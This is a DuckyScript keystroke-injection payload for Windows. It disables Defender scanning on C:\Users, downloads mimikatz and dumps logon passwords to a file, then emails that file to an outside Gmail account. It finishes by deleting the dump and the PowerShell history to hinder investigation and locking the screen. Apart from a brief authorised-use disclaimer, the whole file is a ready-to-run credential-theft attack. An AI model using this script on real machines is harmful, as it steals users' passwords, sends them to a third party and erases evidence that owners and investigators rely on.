REM Title: windows password grabber
REM Arthor makozort, https://github.com/makozort
REM Target: windows 10 (with admin access), might work with windows 7 idk
REM THIS IS FOR AUTHORISED USE ON MACHINES YOU EITHER OWN OR HAVE BEEN GIVEN ACCESS TO PEN TEST, MAKOZORT IS NOT LIABLE FOR ANY MISUSE OF THIS SCRIPT
REM --------------set default delay based on targets computer speed, 350 is around mid range (I think)
DEFAULT_DELAY 350
REM -------------first delay is 1 second (you may need more) to let windows set up the "keyboard"
DELAY 1000
REM ------------open powershell as admin and set an exclusion path in the C:\Users path
GUI r
STRING powershell
CTRL-SHIFT ENTER
DELAY 600
ALT y
STRING Set-MpPreference -ExclusionPath C:\Users
ENTER
STRING exit
ENTER
REM -------------download mimikatz
GUI r
STRING cmd
CTRL-SHIFT ENTER
DELAY 600
ALT y
STRING powershell (new-object System.Net.WebClient).DownloadFile('LINK TO MIMIKATZ.EXE DOWNLOAD HERE','%temp%\pw.exe')
ENTER
REM ------------run the following mimikatz commands and print results in new txt file
DELAY 4000
STRING %TEMP%\pw.exe > c:\pwlog.txt & type pwlog.txt;
ENTER 
STRING privilege::debug
ENTER
STRING sekurlsa::logonPasswords full
ENTER
STRING exit
ENTER
REM< --------- delete mimikatz
STRING del %TEMP%\pw.exe
ENTER
STRING exit
ENTER
REM -------------email the pwlog.txt to your email
GUI r
STRING powershell
CTRL-SHIFT ENTER
DELAY 600
ALT y
STRING Remove-MpPreference -ExclusionPath C:\Users
ENTER
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('THE-PART-OF-YOUR-EMAIL-BEFORE-THE-@
SHIFT 2
STRING gmail.com', 'PASSWORDHERE');
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'THE-PART-OF-YOUR-EMAIL-BEFORE-THE-@
SHIFT 2
STRING gmail.com'
ENTER
STRING $ReportEmail.To.Add('THE-PART-OF-RECEIVERS-EMAIL-BEFORE-THE-@
SHIFT 2
STRING gmail.com')
ENTER
STRING $ReportEmail.Subject = 'Hello from the ducky'
ENTER
STRING $ReportEmail.Body = 'Attached is your duck report.' 
ENTER
STRING $ReportEmail.Attachments.Add('c:\pwlog.txt')
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 4000
STRING exit
ENTER
REM ------cleanup time
GUI r
STRING powershell
CTRL-SHIFT ENTER
DELAY 600
ALT y
REM ----------delete the txt file
STRING del c:\pwlog.txt
ENTER
REM -------remove powershell history (this probably wont be enough to remove all traces of you, this is just to prevent inital investigations
STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
ENTER
STRING exit
ENTER
REM ------lock the pc
GUI l